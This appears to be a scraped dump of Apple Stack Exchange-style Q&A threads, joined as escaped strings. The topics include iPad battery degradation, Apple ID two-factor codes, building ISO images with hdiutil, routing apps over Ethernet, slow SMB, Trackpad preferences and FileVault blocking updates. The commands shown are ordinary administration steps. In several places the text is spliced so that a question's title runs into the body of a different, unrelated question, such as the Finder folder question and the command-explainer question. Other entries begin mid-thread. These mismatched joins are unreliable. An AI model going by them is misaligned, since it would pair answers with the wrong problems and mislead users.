iPad with as much care as I did, and all the research indicates this iPad’s battery should have easily lasted for thousands of cycles. Yet, this still happened, so I’m pretty sure I have a lemon in my hands.\nMy next step is to try to perform a full charge, followed by a full discharge (all the way until the iPad shuts off on its own) and another full charge, without any partial charges in between, just to see if this is a calibration issue with the battery gas gauge IC. I’ll report back once this is done.\nUPDATE Jul 26 2019: did a full discharge cycle followed by a full recharge cycle. Battery health improved somewhat, to ~84%. There's also a lot of variation. For instance, with the charger connected and at 100% charge (so it's no longer accepting charge), over the course of a few minutes, I've seen the health change from 84.1% to 83.6% and then climb back to 83.9%. I definitely think this battery is somehow defective.\n\nA: The battery health (beta) feature is currently only supported on iPhones as far as I know. However, a battery condition diagnostic can be run by apple support over wifi either by AppleCare over the phone / online chat, or of course in store at a genius bar.\nIf the battery has degraded to that percentage of original capacity, according to coconut, it's always a good idea to verify this with the diagnostic tools that apple support use.\niPad batteries are not replaced at Apple stores due to the nature of their manufacture being sealed units. Most 3rd party (and usually not apple authorised) repair places that offer this service will not replace with apple certified batteries and this will therefore invalidate any warranty status you probably still have if it was brought new in October 2017.\nAs far as I know the current capacity of your battery will be considered within specification as it's only 80% and lower that is considered failed or consumed. Batteries that pass this condition test may not be eligible for in warranty service from apple.\nHowever, it may be on it's way to early failure if coconut stats are accurate. To quote www.apple.com/batteries/service-and-recycling/; \"iPad Owners\nYour battery is designed to retain up to 80% of its original capacity at 1000 complete charge cycles. The one-year warranty includes service coverage for a defective battery.\"\nIt could be that your battery may be defective if it has degraded to 92% of original capacity after only 63 charging cycles. Again verify this with apple support, but also consider if usage or environmental factors may have contributed to this seemingly rapid degradation.\nCheck out www.apple.com/batteries/maximizing-performance/ to see if there are any pointers or tips that might help, otherwise contact apple support to log your battery issue whilst still within warranty. This will give you, and them, better options in the future if issues persist or worsen.\nHope this helps.\n\nA: I wouldn't worry until you're at 80% of FCC as long as it doesn't shut down with more than 20% charge remaining. There are many cells in the battery and the degradation is non-linear and Apple backs the 80% limit with repairs they pay for.\nI would keep updating the iOS and to iPadOS when it comes out this fall as Apple is making a lot of charge and lifespan related changes to not always run full hot charge to 100% always and instead optimize a bit more for longevity - especially if you leave your device mostly full and mostly connected to a charger.\nYou can get remote diagnostics from Apple Support online and in stores, so if you have a year end warranty coming up or AppleCare expiring - you can schedule a checkup 2 weeks before that transfer of responsibility from Apple to you and be sure you're not missing an opportunity for Apple to repair the battery if it's out of the design limitations.\nApple's diagnostics are quite a bit better than coconut in my experience, but it's good you're watching it. Keep your devices cool so that the long term health is maintained and also - be sure to run down the battery regularly. 63 cycles for 6 months means you're keeping that battery over charged in the aspect of for long term storage you want it at 50% charge so consider putting more discharge cycles on it as opposed to always having it 100% full.\n", "Q: Folder pop open but not in Finder I'm running High Sierra 10.13.5 on my iMac.

She is setting up a borrowed iPhone 4S (with iOS 8)... but when introducing her iCloud credentials, the phone asks her for a verification code. This code is sent to her old iPhone... but since it's screen is broken, she can't read the code.\nI've been trying to help her, but all the methods I've found (iforgot.apple.com, use \"Find my iPhone\" in my own phone) involved receiving a passcode in her old iPhone... the one that she where can't read the screen. The only alternative seems to initiate an account recovery, which may take days, and from what I've read (https://www.digitaltrends.com/mobile/how-to-reset-your-apple-id-password/2/) also involves receiving a verification code in the iPhone.\nMy friend does have a Mac signed into iCloud, and also access to the email address of her iCloud account. Isn't there a way to receive the verification code in the Mac, or through email? Maybe I'm missing it, but I haven't been able to find any way.\n\nA: Have her put the SIM card of the iPhone 7 into the iPhone 4s and then when the 4s asks her for the code, she can say \"Didn't receive code\" and then chose the option \"Text me\" and it will text her the code if that number is her trusted number and if the number is still active.\nThen she can put that trusted number into her iPhone 4s. Once she does that she needs to go to www.appleid.apple.com and then sign into her account and then add a new trusted number. Also make sure that she is really signed into iCLoud on her Mac. You can click on the Apple Logo -> System Preferences -> iCloud and then see if it asks her to sign in or enter her password. If not, then she is signed in.\nIf she is in the setup process, she needs to setup the iPhone as new (Apps & Data screen), and then when it asks her to sign in, DON'T SIGN IN. Choose below it \"Forgot password or don't have an Apple ID?\". On the next page choose \"Setup Later in Settings\" and it will let her setup the iPhone without an Apple ID so she can get the code she needs.\nLet me know if you have any questions!\n", "Q: Create disk image which can be read on Windows I am interested in creating a disk image, using Disk Utility (or any other software) on macOS which can also be read on Windows.\nDisk Utility provides the ability to create .dmg, .sparseimage, and .sparsebundle images all very conveniently. This is useful for me when I have a lot (such as a couple thousand) small files which I want to keep together for convenience purposes, but which is easy access to access and modify. Hence I use disk images (instead of disks), as they are single (or a small group of) files which can be mounted to reveal all the smaller files.\nHowever, as far as I know, the disk images created with Disk Utility can only be read an modified only on macOS. I heard of a utility on Windows which viewing of .dmg images, but I remember this was a non-native, limited solution. \nIs there a way to create such images on macOS, which is (preferably natively) compatible with Windows?\n\nA: Yes you can actually create an .iSO image file on your Mac with Disk Utility and a little bit of Terminal magic. \n\nConnect an external drive (or, if you have an older Mac, insert a disc into the CD/DVD drive) to your Mac and launch Disk Utility. This is the device that you will be placing your files on for conversion. A USB Drive is also useful if you can't find an empty Your disk will appear in the left column window.\nNow that you’ve selected the source of the disc image, click on File > New > Disk Image from... In the popup window, select Desktop as your destination. Next, make sure to choose DVD/CD Master as the Image Format. Choosing this format ensures the contents of the disk are copied entirely as a .CDR image.\nYou should keep the image’s name short so that it’s easily reproduced.\nIf asked, enter your Mac password and hit OK to begin the disk image process. Depending on how large the disc is, the amount of time that’s necessary varies (Which makes USB drives very effecient). You’ll see a progress bar estimating the time until completion.\nOnce the process finishes, hit “Done,” and check your Desktop for the .CDR image. In its current state, the disk is ready for use on any Mac. To share the file with Windows users, you’ll need to convert it into a recognizable format. To do this, you’ll use your Mac’s Terminal app.\n\nAssuming your .CDR file is on your Mac’s Desktop, open Terminal and type the following and hit the enter key:\ncd desktop\n\nThen, enter this line of code to transform the .CDR to .ISO and hit enter:\nhdiutil makehybrid -iso -joliet -o [filename].iso [filename].cdr\n\nSubstitute both instances of [filename] with the name of your .cdr image. For example, I named my ISO file TEST-IMAGE, so the line of code I used is:\nhdiutil makehybrid -iso -joliet -o TEST-IMAGE.iso TEST-IMAGE.cdr\n\nTerminal will create a new hybrid image. This image can be used by both Windows and Mac computers that use ISO 9660 and HFS file systems.\n\nA: An Image can be made from a folder which will can be mounted by both the macOS High Sierra and Windows 10 operation systems. (And perhaps older versions of these operating systems, but I did not test for this.) \nThe steps are given below.\n\n\n*\n\n*Open the Disk Utility application.\n\n*From the menu bar select File->New Image->Image from Folder....\n\n*Select the folder the click on the Choose button.\n\n*Choose a name and where to save the image file. For Encryption: choose none and for Image Format: choose hybrid image (HFS+/ISO/UDF).

I'm new to apple products, just got a new iPhone 7.\nI've been an avid GNU/Linux and Android, but decided to give iOS a chance.\nI was wondering if it is possible to change the phone calendar picker (looks like a roulette wheel) to a calendar grid.\nI'm looking for a way to change the date picker of existing applications, such as Gmail and Safari, e.g., by activating/deactivating a setting configuration or tweaking the application.\nPrecisely, I want to change from this:\n\nto this:\n\n\nA: An individual application could present their own date picker if it were programmed that way. You cannot change the applications made by other people.\nA jailbreak tweak could potentially try to make this change, but I do not know of any.\nIf you are looking to make your own application, I would recommend asking in the regular Stack Overflow.\n", "Q: Does turning off cellular data significantly improve battery life? I almost always turn off cellular data when I lock the screen. I only turn it on when I’m using internet. But it’s annoying to do that almost every time. Does it worth the trouble?\n\nA: You can follow general rules to optimize your battery life.\nhttps://www.apple.com/batteries/maximizing-performance/.\nNow respecting your question, you save a lot of battery by turning cellular data only when you needed. Cellular data consumes a lot of battery power, specially when yo have have no coverage or low signal:\n\"No Cell Coverage and Low Signal. This indicates that either you are in a poor cell coverage area and your iOS device is searching for a better signal or that you’ve used your device in low-signal conditions, which has affected your battery life.\"\nThis is according to previous apple link, however, take into consideration that GPS works with cellular data so if you leave it by accident powered on, your battery charge will decrease dramatically.\nAlso I recommend you to have your iPhone up to date, for possible bugs, of course back-up first.\nhttps://support.apple.com/en-us/HT203977\nPay attention on one detail, if you back-up an iPhone with already performance issues, the iOS or iCloud back-ups could be affected too. So it is important to back-up often and not wait to have problems to back-up before an up date or even a restore.\nKind regards!\n\nA: My subjective opinion is that while yes, turning off cellular data would extend the battery standby time, you would see more significant improvement by simply enabling low-power mode on the battery.\nThis is dependent on your individual usage patterns of course.\nThere are a few discussions and articles on the subject of increasing battery life at Quora, Apple Discussion Board, Copytrans.net\nThe material of the above seems to indicate that the simple act of disabling the cellular-data in and of itself isn't saving power, should you not actually be using the cellular data to receive or transmit data. The fact that transmitting and receiving cellular data does consume battery power is what would lead to an increase in standby time ie. comparing the battery usage between a device with mobile data enabled (but not actively being used) and the battery usage of a device that has mobile data disabled, you would not expect to see a significant difference.\nComparing the battery usage between a device with mobile data enabled (with high levels of push-service data being used) and the battery usage of a device that has mobile data disabled, you would expect to see a significant difference in standby time - hence the dependence on your individual usage patterns in this case.\nLow-power mode disables various services and features, including mail fetch, Hey Siri, background App refresh, automatic downloads and some visual effects are reduced or turned off. I would expect the mobile data usage to be similar in both the cellular-data disabled, and battery low-power modes, with the low-power mode additionally disabling various processor intensive features.\n", "Q: WindowServer process takes a lot of memory I'm using a MBP 13\" 2014 on macOS high Sierra with a 4k monitor. \nThe memory usage of WindowsServer can go quite high (up to 40 GB).\nThe only solution I found is to reboot my computer -- as the memory usage never goes down. The problem started with MacOS Sierra I think. \nDoes someone has a piece of advice or a better solution than rebooting my computer ? \n\nAnd after closing all the running apps on my computer, it is nearly the same memory usage:\n\n\nA: According to this article  this appears to be a bug in the system when used with a Scaled Display resolution\n\nThis seems to be a bug with scaled screen resolution (specially with 4K monitors) in MacOS High Seirra (and perhaps in older versions of the OS as well). Using \"Default for display\" screen resolution seems to fix the issue (Not my ideal resolution, but a temporary fix until an MacOS update with a fix is available).

In order to type special characters, I long press the standard char and then I get a menu to pick exactly the one I need by pressing its number. For example, if I want to type á I need to long press a, then a menu like the following is displayed, and then I need to hit 2 in order to finally type á. However, if I want to type ó, the number is 4 instead of 2.\n\nI want to know whether it's possible to change the sorting of these characters, so that á, é, í, ó, ú, ñ are all on number 1.\n\nA: You may be able to do this by customizing the Accent Menu/Character Picker as described in this earlier answer here:\n", "Q: use some apps on ethernet, others on wifi? Is there any way to tell an application to use a specific network interface? \nI'Ve got the problem that iMessage and other apps need to run on the proxy-free wifi network while other apps such as Xcode need to run on ethernet to connect to the repository in the wired network.\nIs there any way to do this? \n\nA: Some programs specifically gives you the option to choose the source interface. That's the easiest way if this is the case.\nAnother possibility is to use source routing (policy routing) to ensure that requests from your specific source is routed via the interface you need. This is often quite complicated to setup and maintain.\nA third possibility, which is really not about choosing a specific interface, is a practical approach where you change the routing based on the destination instead.\nI.e. if it is only important for you that your app uses the wired ethernet conncetion when talking to the specific repository, you could determine which IP address (or addresses) that repository has - and then add a specific route for that IP over the wired interface. This route would take priority over your default route.\nFrom the Terminal run:\n  route -n add -host xxx.xxx.xxx.xxx -interface en0\n\n(for net local)\nor\n  route -n add -host xxx.xxx.xxx.xxx gw yyy.yyy.yyy.yyy -interface en0\n\n(for routed destinations)\nwhere xxx.xxx.xxx.xxx should be replaced with the IP of the repository. Similarly yyy.yyy.yyy.yyy is to be replaced with the IP of your gateway for the wired interface.\nIf you have several wired interfaces, change en0 to the specific interface.\nIf your repository have multiple IP addresses, run the command above multiple times with the various IPs.\n", "Q: I have several iPhones / iPads, and when I say \"Hey Siri what's the weather tomorrow\", only my main phone will respond, how is it designed? That's is, if I have several iPhones and iPads on the desk for lying there for an hour, and I just said, \"Hey Siri...\" without touching any of the devices, only the phone that I use most often will respond. Does Siri know which one is my main phone and only use it to respond?\n\nA: When you say \"Hey Siri\", the devices that could possibly react to it will communicate with each other using Bluetooth to determine which device will respond: The device that heard you best, or the device that was most recently raised or used will respond to the \"Hey Siri\" request.\nApple has detailed the method here:\nhttps://support.apple.com/en-us/HT208472\n\nA: \"Hey Siri\" only really works on select newer iPhones. I had an iPhone 6 for a while and had the option for \"Hey Siri\" but it never worked. Upon getting an iPhone 7 plus... The \"Hey Siri\" feature works great!\nYour main phone must be newer than the others if \"Hey Siri\" only works on that one.\nThat or \"Hey Siri\" is disabled on the other phones and/or iPads.\n", "Q: Why is my ipad being charged at low speed and sometimes discharged even when plugged in? When I plug in my tablet and use it normally at normal brightness or even not using at all, its battery is often discharging (at 20-2000mA)\n\nand when it charges the speed is very low (only 300-500mA)\n\nThe tablet also runs undervoltaged and shuts down at 30% battery discharged and at 15% plugged in. Can you tell me how to fix?\n\nA: If you charge from a standard USB port (on a PC) or an ordinary USB charger, it is quite normal to charge with up to 500 mA. This is the maximum you can get.\nIf you want to go beyond that, you'll need a USB 3.0 port or high speed chargers. For example Apple supplies special 10W, 12W, 18W etc. chargers for various iPads.\nIt is also normal that an iPad is capable of consuming more power than a 500 mA charger supplies. Therefore you can experience that the iPad is discharging the battery even when it is connected to a charger.\nTo avoid that, close power hungry apps (i.e. don't be playing an intensive 3D game while looking at your battery stats for example), and/or use a higher capacity charger.\n\nA: If you tablet is charging slowly, then your power supply is probably under-powered. Make sure that your charger brick is at least 5v and 1Amp (5w). If possible, use the charging brick that came with your tablet.\n", "Q: Very slow SMB on MacOS with 10G network We have a 10 Gigabit network with a mix of Windows 10, Linux and MacOS (Sierra 10.12.6) machines.\nThe transfer speeds between the Windows or Linux machines are OK: between 500 and 800 MB/s for big files (10 to 100 GB).\nBut the Macs show a read speed of around 130 MB/s only.\nCuriously, write speeds when writing from Mac to Windows or Linux, are much better. The slow speed is when transferring files between two Macs or when the Mac is reading from a Win/Linux share.\nThe problem is really specific to SMB on Mac.\n\n\n*\n\n*All the machines have SMB signing disabled as per Apple's recommendation. With the default setting which enables signing, the speeds were even (a lot) worse: around 60-70 MB/s.\n\n*The disks used were all RAID 5 arrays with local speeds between 600 MB/s. and over 1 GB/s. (tested with dd and Blackmagic Speed Test)\n\n*The raw network speeds tested with iperf3 were between 5 and 10 Gigabits/s.\n\n*Using FTP instead of SMB showed speeds around 500 MB/s in both directions (using the Mac's default ftpd).\n\n\nOther suggestions I came across, which of course made no difference:\n\n\n*\n\n*Using IP addresses instead of hostnames.\n\n*Using cifs:// instead of smb://. (that acually forces SMB 1 instead of SMB 3, and made the speed much worse)\n\n\nA: I would turn on smb3 signing, smb3 encryption and retest. We are seeing the best performance with the latest OS, newest protocols and full encryption. It’s not twice as fast, but it’s measurably faster for a couple of vendors across the board for us. \nNext, get a wire shark dump and look at the SMB commands. Work with networking on MTU and jumbo packets as that can really vault large transfers and be worth the engineering work if you can’t speed up large reads. \n", "Q: How to create MacOS/*nix command explainer text like this using a tool? \n┌── ln(1) link, ln -- make links\n│   ┌── Create a symbolic link.\n│   │                         ┌── the optional path to the intended symlink\n│   │                         │   if omitted, symlink is in . named as destination\n│   │                         │   can use . or ~ or other relative paths\n│   │                   ┌─────┴────────┐\nln -s /path/to/original /path/to/symlink\n      └───────┬───────┘\n              └── the path to the original file/folder\n                  can use . or ~ or other relative paths\n\n\nFound this useful method to explain Linux Commands, but have no idea how @grg did it.\nManually is very time consuming.

Let's say, for what ever reason, System Preferences.app is already activated (with, for example, window Sharing/ Remote Management/ Computer Settings open) but not visible or not front most or whatever.  In Script Editor, you try to run tell application \"System Preferences\" to reveal anchor \"SpeakableItems\" of pane id \"com.apple.preference.universalaccess\" That command completes with no obvious errors but when you switch over to System Preferences, your \"revealed anchor\" is not revealed. Ok, no big deal, easy fix. I'll just insert a tell application \"System Preferences\" to quit command prior to the reveal anchorcommand. Running the updated code this time, you get a (userCanceledErr:-128) error. All of this hassle is because that secondary drop down window in System Preferences is open. In my opinion, the do shell script \"killall 'System Preferences'\" command seems to be the best solution.\n\nA: I've just tried to do the same thing and I believe this is not possible yet.\nIn the Script Editor app you can see the \"library\" for documentation on the system events.

I expect to be able to change the firmness required to click and activate Force Click. However, in my System Preferences Trackpad preference pane, there's no slider for the firmness, only for tracking speed:\n\nAccording to Apple's online documentation, there should be a slider in that blank area in the lower left for firmness, like so:\n\nBut, as shown in the first screenshot, the slider for click firmness doesn't show up on my Mac Pro.\nHow do I adjust the click firmness on my new Magic Trackpad 2?\n\nA: Not an answer yet, but I came across the same issue earlier this week. I tested it on a variety of Macs (two MBPs and one iMac Pro) running El Capitan, Sierra and High Sierra respectively. \nIn all cases the Trackpad settings provided no click pressure options, or Force Click/haptic feedback option. \nI've got a case open with Apple Engineering and will update this answer when I hear back.\n\nUpdate\nI've spent the last week troubleshooting this with Apple and we've confirmed this is an issue with how macOS High Sierra interacts with the Magic Trackpad 2.\nIn our testing we found the following:\n\n\n*\n\n*A Magic Trackpad 2 connected to any model MacBook running El Capitan or Sierra will display the Click pressure slider and the two checkboxes relating to Force Click/haptic feedback and Silent clicking\n\n*A Magic Trackpad 2 connected to any desktop Mac running El Capitan or Sierra will display the Click pressure slider and the two checkboxes relating to Force Click/haptic feedback and Silent clicking\n\n*Any model MacBook running on El Capitan, Sierra or High Sierra will display the Click pressure slider and the two checkboxes relating to Force Click/haptic feedback and Silent clicking when there is no external Magic Trackpad 2 connected\n\n*Any model Mac running on High Sierra will not display the Click pressure slider and the two checkboxes relating to Force Click/haptic feedback and Silent clicking when there is an external Magic Trackpad 2 connected\n\n\nThe above results are repeatable regardless of the connection type (i.e. the results are the same via Bluetooth or USB).\nBelow is a screenshot showing how the preference pane looks with a Magic Trackpad 2 connected to a Mac running El Capitan or Sierra:\n\nEND RESULT \nThis has been marked as a known issue with macOS High Sierra and is unlikely to get resolved in High Sierra's software cycle. Look for a fix during macOS Mojave's lifespan.\nIn the meantime, I would go to the How to use the Force Touch trackpad page, scroll to the bottom and select the No box so you can provide feedback about how the content doesn't apply to macOS High Sierra when using a Magic Trackpad 2.\n\nUPDATE - December 2018\nI've just tested the same Mac with the same Magic Trackpad 2 connected. First booted from macOS High Sierra, and then within minutes booted from macOS Mojave.\nBelow is a side-by-side comparison:\n\nAs you can see, the Trackpad System Preferences in macOS Mojave show the Click pressure slider and the two checkboxes relating to Force Click/haptic feedback and Silent clicking. Same computer, same trackpad, different OS.\nThis confirms that Apple has fixed the bug that was present in macOS High Sierra so that the Trackpad preferences work properly in macOS Mojave, but that no fix is likely to ever come to High Sierra itself.\nInterestingly, for some reason macOS Mojave reads the trackpad as having 74% battery level remaining, while macOS High Sierra displays this as 72%. \n\nA: \nSeems it does work again in Mojave.\nRunning on a MacBook Pro 2017 13\" NTB, with 10.14.1 (the latest update)\n", "Q: Images are intermittently distorted when copy-pasted into Power Point This is just a small addition to an existing topic, but it's driving me crazy and I don't see an answer anywhere, or have time to gain user points. I reluctantly switched to High Sierra recently on my MacBook and MacBook Pro (I have a lot of old software I'm happy with). When pasting images from a browser or pdf (or probably anywhere) into Office 2008 Power Point, they often come out skewed in the way others have shown.

Having a CPU temperature of 43 degrees seems absurd.\nEDIT:\nThe widget Fanny also displays these speeds https://www.fannywidget.com/\n\nA: There’s a lot to answer but here are my thinking:\n\n\n*\n\n*Power off your Mac and reset the SMC one time - those blower speeds are non-sensical and look like an integer overflow.\n\n*Run software updates - apply EVERYTHING and consider downloading the OS installer and running it from Recovery HD - install right over your system as that won’t erase any accounts or settings and it will download EFI / firmware updates as needed - especially if you’re connected to a viable network when you reinstall.\n\n*A temperature of 100 C isn’t ridiculous - modern CPU run at the boiling point perfectly fine for extended periods - 43 C is a cool fall evening with a fresh breeze and nothing to worry about at all.\n\n*Don’t put much stock (if any) in the diagnostics - that’s designed to detect major component failures - not any sort of battery or fine grained test in my experience. Even the tests Apple runs at the Genius Bar while you wait are pretty trivial, basic tests.\n\n*Only 3 cycles on a battery makes me think you have a new Mac - be sure you contact iStat menus to be 100 % sure the software fully supports your specific model. I have seen new machines report nonsense until the vendor updates their software for new hardware and new sensors.\n\n\nA: You should load the app Macs Fan Control from here. This app will tell you the temperature of key parts of your mac and also allow you to control your fan speed.\n\n\nA: The only thing that worked for me was resetting SMC (System Management Controller).\nPress SHIFT OPT CTRL and the Power Button at the same time.\nFor more detail read here.\n", "Q: Which OS should I downgrade to? I recently bought a 2nd-hand iMac which has the following specifications:\n\n\n*\n\n*iMac (27-inch, Mid 2011)\n\n*Processor: 3.4 GHz Intel Core i7\n\n*Memory: 16 GB 1067 MHz DDR3\n\n*Graphics: AMD Radeon HD 6970M 2048 MB\n\n*Storage: 1TB SATA HD\n\n\nIt had Sierra installed, and I used it for a couple of weeks.\nI then upgraded to High Sierra and noticed that it is very slow.\nIt seems to lag everywhere, even when inputting text into this text field in Safari. The lag is not extreme, but it is there.\nI assume this 2011 iMac has insufficient processing power to smoothly run High Sierra which was released in 2017, so I would like to downgrade to an earlier OS.\nI considered downgrading to Sierra, but I wonder whether it would be even better to downgrade to an earlier OS such as El Capitan or earlier.\nFrom the MacOS release dates on the Wikipedia page, I assume this iMac was released with Lion.\nI use XCode 9 and not much else, and I assume this iMac has a 64-bit processor, and I don't know which was the first OS to support 64-bit.\nI'd like to downgrade to the earliest version that I can, to ensure the smoothest experience.\nSo which OS should I downgrade to?\n\nA: Considering your usage, the answer is fairly straightforward:\n\n\n*\n\n*Xcode 9.0 to 9.2 require as a minimum macOS Sierra 10.12.6\n\n*Xcode 9.3 to 9.4.1 require macOS High Sierra 10.13.2\n\n\nSo you're basically limited in your options to these two versions of macOS.\nYou didn't specify the exact version of Xcode you have installed, but you may need to change that to go down to macOS Sierra. Also, you may need to consider your long-term usage, as Xcode 10 (still in beta) requires macOS High Sierra 10.13.6 and it won't be long before a version will require macOS Mojave.\nIf you decide you want to keep the iMac, then your best bet would be to upgrade to an SSD (either replacing the optical drive, or the internal HD). I suppose another option would be to get an external SSD which supports a Thunderbolt 1 connection and then install macOS on that to use as your main boot disk. While a little clumsy, it's still going to result in a better experience all around.\n", "Q: How to make keyboard shortcuts work with dual keyboards? So I decided to experiment with two keyboards for the ergonomics, which it accomplishes fairly well (so left hand on left side of left keyboard, and right hand on right side of right keyboard). However, it does break the intuitive nature of keyboard shortcuts.\nFor instance, let's say I do my capitalisation by holding down the right shift key, which would now be done on the right keyboard. If I then press a key of the left keyboard in addition, say the letter Q for instance, then it remains lowercase. If I pressed the left keyboards shift then it would have worked fine, as all held keys are on the same keyboard.\nThe same applies for pressing cmd on the left keyboard, and space on the right keyboard, spotlight will not appear. As such, modifiers only work on the same keyboard, not across keyboards.\nIs there a way at all to have keyboard shortuts take into account the state of all connected keyboards? As otherwise, the inutility of keyboard shortcuts under this model would outweigh the benefit of the ergonomics.\n\n\nA: Ok seems installing Karabiner (website, github) was what was needed. Found it via the deprecated my-multiple-keyboards github project.\n", "Q: Keychain Won't Remember Router Administrative Password macOS High Sierra, Safari 11.1.2, MacBook Air mid-2013, Netgear R6400 wifi router. All the software on the computer and router is up to date. Both the Mac and Safari work without difficulty.\nThe network works fine, the computer connects easily (either via wifi or Ethernet), and except for this one issue I can access the router's administrative web pages and change its settings without difficulty. \nThe issue is...Keychain won't remember the router's administrative password. The router's administrative login page has a box to check to \"Remember this password,\" which I dutifully check. The password is remembered for a few minutes only, then I have to manually enter it again. It's a complicated password, and I'd be happy if Keychain remembered it, as it does for every other password I use.\nI've quit and restarted Safari, deleted the Keychain entry for the router (and all other 192.xxx.x.x URLs, there weren't many), deleted Safari’s cache and cookies related to this URL, quit and restarted Keychain, restored the router .cfg file from backup, and restarted the computer in Safe Mode followed by deleting the Keychain entry again. \nThe forgetfulness continues. Any idea why this is happening? Anything else I might try to fix it?\n\nA: The 'forgetfulness' is likely to be intentional.\nSafari won't offer to remember any passwords etc if the page tells it not to.\nI don't know the technical details of how this is accomplished, but banking pages etc won't do it either.\nThe 'remember' box on the page is not for Safari to remember, it's for the remote device.\nThere used to be a freeware extension called 'autocomplete' that would disable this [lack of] functionality in Safari, but it hasn't worked so well in recent years.\nI just discovered the author now has a paid version, called StopTheMadness, still fully supported, which might do the same thing. I haven't been able to fully test it yet - just got it 5 minutes ago.\n", "Q: File Vault Paused Im trying to update to High Sierra, But can't because my file vault is currently encrypting. (so says the error message) However, when I check the status, it shows that it is \"paused\" and has been like that for over a week. Ive looked around, troubleshooted as much as i could and can't get anything to work. Ive tried the Sudo command and repairing the Disk... Nothing works... PLEASE HELP.\n\nA: Is this an Apple laptop? If so, you need to connect it to a charger for the encryption to continue.\n", "Q: new 2tb hd not useable I have a new hard drive which I can't seem to access correctly. It is a 2TB lacie drive and when I connect it I only see ~400MB. This is the output from fdisk:\n\nWhat is wrong and how can I proceed?\n\nA: It turns out Disk Utility wasn't showing all devices, only volumes. I changed that option in the menu and was able to actually format the 2TB drive.\n\n", "Q: iPhone X - Does wireless charging speed differ depending on the exact location of the iPhone on the charging mat? Does the wireless charging speed differ depending on the exact place we put the iPhone on the charging mat?\nI mean, if I don't put the iPhone correctly on the charger, it won't start the charge. But as long as the charge is ok and starts, will the speed only depends on the power of the charger, or may it depend on the exact position of the iPhone? Charging faster if the phone is exactly on the good location and slower if it is a bit away from the center location of the wireless charger.\n\nA: The Qi standard (that the iPhone uses for wireless charging) allows for multiple types of chargers regarding phone placement.\nSome chargers require you to place the phone at a very specific place in order to charge. They will generally not be able to charge at all if you place the phone incorrectly.\nMost chargers allows so-called free placement, where you can place the phone any place on the charger (within reason) and get full speed charging. This is done by actually having more coils than really necessary within the charging surface. Those directly underneath the phone are then used and activated, whereas the other are not. This allows the charger to work across the full surface independently of phone placement.\nThe standard also allows for chargers where the coils actually move to place them underneath the phone. I haven't seen such charger available for ordinary home users though.\n", "Q: A new macOS version exists, no update available from the App Store I recently reinstalled macOS on my MacBook Pro which is now on macOS 10.13.5, which isn't the latest version because I used an old macOS High Sierra installer. However, when I opened the Mac App Store to update to 10.13.6, it didn't show any updates. I thought it was an issue at Apple's side, so I downloaded the macOS 10.13.6 Combo Updater, but that didn't work either. It gave an error: \"This volume doesn't meet the requirements for this update\". Is my installation corrupted? If not, how can I fix it without another reinstall?\nThis is a MacBook Pro (Retina, 13-inch, Early 2015). I have enabled FileVault after installing macOS and it is still encrypting (about 13 hours left).\n\nA: Apparently macOS doesn't allow you to install macOS Updates while FileVault is encrypting, so it blocks every possible way of installing software updates. However, it is still possible to install macOS updates from an external flash drive since there is no encryption going on when you boot from an external device, thus allowing you to install the update. You will need to follow Apple's instructions on how to create and boot from an external macOS Install USB. The only thing you need to do different is before starting the macOS installer, open Disk Utility, select your disk and mount it. You will be prompted for your disk's password since it uses FileVault. After that, simply start the Installer and install macOS onto your main partition. It will not overwrite your existing installation. It will only replace essential system files with fresh ones, thus updating your system.\n\nA: I had the same problem with MacOS High Sierra. \nIf you don't want to use a USB stick to port your OS there just fire up the App Store and search for the OS name (in my case was Catalina): then press GET and install it from there\n\n", "Q: Is this an iCloud sync/backup or do I have a data leak? What are these pictures showing my iPhone's screen is doing? I had no open video apps and was no streaming anything in Safari nor was Safari or Tv app open but it says data:video - Why data if a video?\n \nIs this is just iCloud and if it is, then it’s occurring across my WiFi not my cellular data, correct?\nI’m trying to figure out what sporadically spikes data usage on several iPhones around the same time. (Yes we have family share but this began way before that). \nEvery few months, the data on every cell phone under my account seems to spike 3X it’s normal usage or more - even though we use WiFi at home religiously.\nBecause of this, I can’t reduce my cellular plan since the overage charges in months with high data usage would negate any cost savings. I’d like to chalk it up to cellular carrier conspiracy but joking aside.\nAny tips how to check what’s eating data beyond looking in my settings (inconclusive) are much appreciated.\nP.S.: Probably unrelated but a long time ago, my son thought he’d isolated it to some iOS games (talking animal head apps or some such) and after deleting the games on phones installed issue resolved for about a year and a half but it’s back.\n\nA: The picture displays the playback controls on the device. The name listed that you point out (the \"data:video/...\" part) is actually a description of the last thing you've played back. \nIn case of internet content on a web site for example, this would typically be a URL for a video file.\nIn this case it is actually a URL starting with \"data:\". This is a special URL that is constructed so that the actual contents of the video is actually embedded in the URL.\nThis is becoming a more popular technique on web page to embed content (icons, graphics, small \"gifs\" or similar) on web pages without having to refer to external resources. I.e. this content appears instantly with the rest of the page as it is actually loaded with the source of the web page itself.\nTo sum it up: What you're seeing is perfectly normal. It is not a data leak, nor does it have anything to do with an iCloud Sync or backup. It is just an indication that you have recently visited a web page (or similar) that featured a piece of embedded content.\n", "Q: Can I set a delay on Mission Control Hot Corners? Or maybe change how they’re triggered? I love using Hot Corners, but I regularly trigger them by mistake when performing other tasks, so I disabled them for a while and found I couldn’t live without this functionality.\nThis got me to thinking - what if I could set a delay (0.5 secs) before the Hot Corners get triggered, or maybe set it so it’s triggered by a right-click action?\nI had a look at the Mission Control system preferences but didn’t see any way to do this instead of just accidentally moving the mouse.. \nCan I do this? Maybe a terminal command? Other suggestions welcome too.\n\nA: Yes! When setting up your Hot Corners in System Preferences, just hold down a modifier key.  For example, pressing the ⌘ key while clicking on a corner means you’ll configure it so it’s only triggered while also holding down the ⌘ key.\n", "Q: Phone lock app for ios other than assistive touch I would like to use an app to lock the screen instead of using the lock button. Right now I have set the tap on assistive touch to lock the screen but I don't like it always hovering above all other apps.\nIs there any app that can lock the phone or make assistive touch appear only on the home screen?\n\nA: A solution could be to use triple-click on home button to activate Assistive Touch :\n\nTurn on AssistiveTouch\nWhen you turn on AssistiveTouch, you’ll see the AssistiveTouch menu. You can drag it to any edge of the screen, then tap the menu to open it. \nThere are a few ways to turn on AssistiveTouch:\n      Go to Settings > General > Accessibility > AssistiveTouch, then turn on AssistiveTouch.\n      Tell Siri “Turn on AssistiveTouch.” \n      Go to Settings > General > Accessibility > Accessibility Shortcut and turn on AssistiveTouch. \nWhen Accessibility Shortcut is on, you can turn AssistiveTouch on or off from any screen using Triple-click Home. Just press the Home button three times. To adjust the Triple-click speed, go to Settings > General > Accessibility > Home-click Speed.\n\nhttps://support.apple.com/bg-bg/HT202658\nThis would turn a triple click on home button to a lock screen button click !\nAnother alternative which is not as good as the first one, I think, is to move all app icon which are in the bottom right of each of your 